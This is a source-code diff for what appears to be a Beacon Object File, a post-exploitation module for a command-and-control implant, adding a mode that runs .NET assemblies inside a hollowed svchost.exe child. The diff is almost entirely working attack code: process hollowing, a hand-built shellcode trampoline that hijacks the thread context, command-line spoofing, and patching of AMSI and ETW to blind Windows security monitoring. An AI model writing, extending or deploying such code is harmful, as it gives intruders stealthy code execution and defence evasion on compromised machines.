@@ -8,6 +8,7 @@
 
 #define MODE_PE        0
 #define MODE_SHELLCODE 1
+#define MODE_DOTNET    2
 
 #define SRC_BYTES      0
 #define SRC_LOCAL_PATH 1
@@ -21,6 +22,21 @@
 
 #define DEFAULT_SPAWNTO_W L"C:\\Windows\\System32\\svchost.exe"
 #define DEFAULT_SPAWNTO_A "C:\\Windows\\System32\\svchost.exe"
+
+#include "dotnet_host_bytes.h"
+
+#define DOTNET_CFG_MAGIC 0x444E4554
+#define DOTNET_FLAG_AMSI 1
+#define DOTNET_FLAG_ETW  2
+
+#pragma pack(push, 1)
+typedef struct {
+    DWORD magic;
+    DWORD asm_size;
+    DWORD args_size;
+    DWORD flags;
+} DOTNET_CONFIG_HDR;
+#pragma pack(pop)
 
 /* ================================================================
  *  Minimal libc replacements (BOF has no CRT)
@@ -985,6 +1001,236 @@ static BYTE* ReadLocalFile(const char *path, DWORD *outSize) {
 }
 
 /* ================================================================
+ *  .NET fork-and-run via embedded CLR host (mode 2)
+ *
+ *  Hollows the embedded dotnet_host.exe into a sacrificial child,
+ *  allocates a data region with DOTNET_CONFIG + .NET assembly + args,
+ *  then uses a 22-byte trampoline shellcode to pass the config pointer
+ *  in RCX before jumping to the host's entry point.
+ *
+ *  Crash in the .NET tool kills the child, not the beacon.
+ * ================================================================ */
+
+static BOOL HollowWithDotNet(HANDLE hProcess, HANDLE hThread,
+                              BYTE *asmData, DWORD asmSize,
+                              const char *argsA, const char *spawntoA) {
+
+    /* --- Phase 1: Hollow embedded dotnet_host.exe into child --- */
+
+    BYTE *hostPE = (BYTE*)KERNEL32$LocalAlloc(0x40, dotnet_host_exe_len);
+    if (!hostPE) {
+        BeaconPrintf(CALLBACK_ERROR, "LocalAlloc host PE: %lu", KERNEL32$GetLastError());
+        return FALSE;
+    }
+    xmemcpy(hostPE, dotnet_host_exe, dotnet_host_exe_len);
+
+    PIMAGE_NT_HEADERS pNt = NULL;
+    if (!ValidatePE(hostPE, dotnet_host_exe_len, &pNt)) {
+        KERNEL32$LocalFree(hostPE);
+        return FALSE;
+    }
+
+    CONTEXT ctx;
+    xmemset(&ctx, 0, sizeof(ctx));
+    ctx.ContextFlags = CONTEXT_ALL;
+    if (!KERNEL32$GetThreadContext(hThread, &ctx)) {
+        BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
+        KERNEL32$LocalFree(hostPE);
+        return FALSE;
+    }
+
+    ULONG_PTR pebAddr = ctx.Rdx;
+    ULONG_PTR origImageBase = 0;
+    SIZE_T br = 0;
+
+    if (!KERNEL32$ReadProcessMemory(hProcess, (PVOID)(pebAddr + 0x10),
+            &origImageBase, sizeof(origImageBase), &br)) {
+        BeaconPrintf(CALLBACK_ERROR, "Read PEB ImageBase: %lu", KERNEL32$GetLastError());
+        KERNEL32$LocalFree(hostPE);
+        return FALSE;
+    }
+
+    NTDLL$NtUnmapViewOfSection(hProcess, (PVOID)origImageBase);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Original image unmapped");
+
+    BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess,
+        (PVOID)pNt->OptionalHeader.ImageBase,
+        pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemote)
+        pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess, (PVOID)origImageBase,
+            pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemote)
+        pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess, NULL,
+            pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pRemote) {
+        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx host: %lu", KERNEL32$GetLastError());
+        KERNEL32$LocalFree(hostPE);
+        return FALSE;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Host PE allocated at 0x%p", pRemote);
+
+    if (!ResolveImports(hostPE, dotnet_host_exe_len, pNt)) {
+        BeaconPrintf(CALLBACK_ERROR, "Host import resolution failed");
+        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+        KERNEL32$LocalFree(hostPE);
+        return FALSE;
+    }
+
+    ULONG_PTR delta = (ULONG_PTR)pRemote - pNt->OptionalHeader.ImageBase;
+    if (delta != 0) {
+        if (!ApplyRelocations(hostPE, dotnet_host_exe_len, pNt, delta)) {
+            BeaconPrintf(CALLBACK_ERROR, "Host relocation failed");
+            KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+            KERNEL32$LocalFree(hostPE);
+            return FALSE;
+        }
+        pNt->OptionalHeader.ImageBase = (ULONG_PTR)pRemote;
+    }
+
+    SIZE_T bw = 0;
+    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, hostPE,
+            pNt->OptionalHeader.SizeOfHeaders, &bw)) {
+        BeaconPrintf(CALLBACK_ERROR, "Write host headers: %lu", KERNEL32$GetLastError());
+        KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+        KERNEL32$LocalFree(hostPE);
+        return FALSE;
+    }
+
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if (pSec[i].SizeOfRawData == 0) continue;
+        if (!KERNEL32$WriteProcessMemory(hProcess, pRemote + pSec[i].VirtualAddress,
+                hostPE + pSec[i].PointerToRawData, pSec[i].SizeOfRawData, &bw)) {
+            BeaconPrintf(CALLBACK_ERROR, "Write host section %d: %lu", i, KERNEL32$GetLastError());
+            KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
+            KERNEL32$LocalFree(hostPE);
+            return FALSE;
+        }
+    }
+
+    AdjustSectionProtections(hProcess, (ULONG_PTR)pRemote, pNt, pSec);
+    KERNEL32$FlushInstructionCache(hProcess, pRemote, pNt->OptionalHeader.SizeOfImage);
+
+    ULONG_PTR newBase = (ULONG_PTR)pRemote;
+    KERNEL32$WriteProcessMemory(hProcess, (PVOID)(pebAddr + 0x10), &newBase, sizeof(newBase), &bw);
+
+    ULONG_PTR entryPoint = (ULONG_PTR)(pRemote + pNt->OptionalHeader.AddressOfEntryPoint);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Host hollowed, entry 0x%p", (void*)entryPoint);
+
+    KERNEL32$LocalFree(hostPE);
+    hostPE = NULL;
+
+    /* --- Phase 2: Write config + assembly + args into child --- */
+
+    DWORD argsByteSize = 0;
+    LPWSTR wideArgs = NULL;
+    if (argsA && argsA[0]) {
+        int wLen = KERNEL32$MultiByteToWideChar(0, 0, argsA, -1, NULL, 0);
+        if (wLen > 0) {
+            wideArgs = (LPWSTR)KERNEL32$LocalAlloc(0x40, wLen * sizeof(WCHAR));
+            if (wideArgs) {
+                KERNEL32$MultiByteToWideChar(0, 0, argsA, -1, wideArgs, wLen);
+                argsByteSize = (DWORD)(wLen * sizeof(WCHAR));
+            }
+        }
+    }
+
+    DWORD configTotal = (DWORD)sizeof(DOTNET_CONFIG_HDR) + asmSize + argsByteSize;
+    BYTE *configBuf = (BYTE*)KERNEL32$LocalAlloc(0x40, configTotal);
+    if (!configBuf) {
+        BeaconPrintf(CALLBACK_ERROR, "LocalAlloc config: %lu", KERNEL32$GetLastError());
+        if (wideArgs) KERNEL32$LocalFree(wideArgs);
+        return FALSE;
+    }
+
+    DOTNET_CONFIG_HDR *hdr = (DOTNET_CONFIG_HDR*)configBuf;
+    hdr->magic     = DOTNET_CFG_MAGIC;
+    hdr->asm_size  = asmSize;
+    hdr->args_size = argsByteSize;
+    hdr->flags     = DOTNET_FLAG_AMSI | DOTNET_FLAG_ETW;
+    xmemcpy(configBuf + sizeof(DOTNET_CONFIG_HDR), asmData, asmSize);
+    if (wideArgs && argsByteSize > 0)
+        xmemcpy(configBuf + sizeof(DOTNET_CONFIG_HDR) + asmSize, wideArgs, argsByteSize);
+
+    LPVOID pConfig = KERNEL32$VirtualAllocEx(hProcess, NULL, configTotal,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pConfig) {
+        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx config: %lu", KERNEL32$GetLastError());
+        KERNEL32$LocalFree(configBuf);
+        if (wideArgs) KERNEL32$LocalFree(wideArgs);
+        return FALSE;
+    }
+
+    if (!KERNEL32$WriteProcessMemory(hProcess, pConfig, configBuf, configTotal, &bw)) {
+        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory config: %lu", KERNEL32$GetLastError());
+        KERNEL32$VirtualFreeEx(hProcess, pConfig, 0, MEM_RELEASE);
+        KERNEL32$LocalFree(configBuf);
+        if (wideArgs) KERNEL32$LocalFree(wideArgs);
+        return FALSE;
+    }
+
+    KERNEL32$LocalFree(configBuf);
+    if (wideArgs) KERNEL32$LocalFree(wideArgs);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Config at 0x%p (%lu bytes: hdr=%u asm=%lu args=%lu)",
+        pConfig, configTotal,
+        (unsigned)sizeof(DOTNET_CONFIG_HDR), (unsigned long)asmSize, (unsigned long)argsByteSize);
+
+    /* --- Phase 3: Trampoline — set RCX=config, jump to entry --- */
+    BYTE tramp[22];
+    tramp[0] = 0x48; tramp[1] = 0xB9;
+    *(ULONG_PTR*)(tramp + 2) = (ULONG_PTR)pConfig;
+    tramp[10] = 0x48; tramp[11] = 0xB8;
+    *(ULONG_PTR*)(tramp + 12) = entryPoint;
+    tramp[20] = 0xFF; tramp[21] = 0xE0;
+
+    LPVOID pTramp = KERNEL32$VirtualAllocEx(hProcess, NULL, sizeof(tramp),
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+    if (!pTramp) {
+        pTramp = KERNEL32$VirtualAllocEx(hProcess, NULL, 4096,
+            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    }
+    if (!pTramp) {
+        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx trampoline: %lu", KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    DWORD oldProt = 0;
+    KERNEL32$VirtualProtectEx(hProcess, pTramp, sizeof(tramp), PAGE_READWRITE, &oldProt);
+    KERNEL32$WriteProcessMemory(hProcess, pTramp, tramp, sizeof(tramp), &bw);
+    KERNEL32$VirtualProtectEx(hProcess, pTramp, sizeof(tramp), PAGE_EXECUTE_READ, &oldProt);
+    KERNEL32$FlushInstructionCache(hProcess, pTramp, sizeof(tramp));
+
+    ctx.Rcx = (DWORD64)pTramp;
+    if (!KERNEL32$SetThreadContext(hThread, &ctx)) {
+        BeaconPrintf(CALLBACK_ERROR, "SetThreadContext: %lu", KERNEL32$GetLastError());
+        return FALSE;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Trampoline at 0x%p → entry 0x%p (RCX=config)",
+        pTramp, (void*)entryPoint);
+
+    /* Step: Spoof command line */
+    if (argsA && argsA[0]) {
+        const char *bn = spawntoA;
+        const char *s = spawntoA;
+        while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }
+        char realCmd[4096];
+        xmemset(realCmd, 0, sizeof(realCmd));
+        MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s %s", bn, argsA);
+        if (SpoofCommandLine(hProcess, realCmd))
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Command line spoofed");
+    }
+
+    PatchAMSI(hProcess);
+    PatchETW(hProcess);
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] .NET fork-and-run ready (asm=%lu bytes)", (unsigned long)asmSize);
+    return TRUE;
+}
+
+/* ================================================================
  *  BOF entry point
  * ================================================================ */
 
@@ -1040,7 +1286,8 @@ void go(char *rawArgs, int rawLen) {
         payloadSize = (DWORD)peDataLen;
     }
 
-    /* For PE mode, we need a writable copy since we modify IAT + relocations in place */
+    /* For PE mode, we need a writable copy since we modify IAT + relocations in place.
+       Dotnet mode passes raw assembly bytes — no local modification needed. */
     BYTE *workingCopy = NULL;
     if (mode == MODE_PE) {
         workingCopy = (BYTE*)KERNEL32$LocalAlloc(0x40, payloadSize);
@@ -1059,14 +1306,14 @@ void go(char *rawArgs, int rawLen) {
     }
 
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Mode: %s | Output: %s | Timeout: %ds | Spawnto: %s",
-                 mode == MODE_PE ? "PE" : "Shellcode",
+                 mode == MODE_PE ? "PE" : (mode == MODE_DOTNET ? ".NET" : "Shellcode"),
                  wantOutput ? "yes" : "no",
                  timeoutMs / 1000,
                  spawntoA);
 
     /* Compute real command line length for PEB padding */
     int realCmdMinBytes = 0;
-    if (mode == MODE_PE && args && args[0]) {
+    if ((mode == MODE_PE || mode == MODE_DOTNET) && args && args[0]) {
         const char *bn = spawntoA;
         const char *s = spawntoA;
         while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }
@@ -1085,6 +1332,9 @@ void go(char *rawArgs, int rawLen) {
     if (mode == MODE_PE) {
         ok = HollowWithPE(sctx.pi.hProcess, sctx.pi.hThread,
                           payloadData, payloadSize, args, spawntoA);
+    } else if (mode == MODE_DOTNET) {
+        ok = HollowWithDotNet(sctx.pi.hProcess, sctx.pi.hThread,
+                               payloadData, payloadSize, args, spawntoA);
     } else {
         ok = InjectShellcode(sctx.pi.hProcess, sctx.pi.hThread,
                              payloadData, payloadSize);
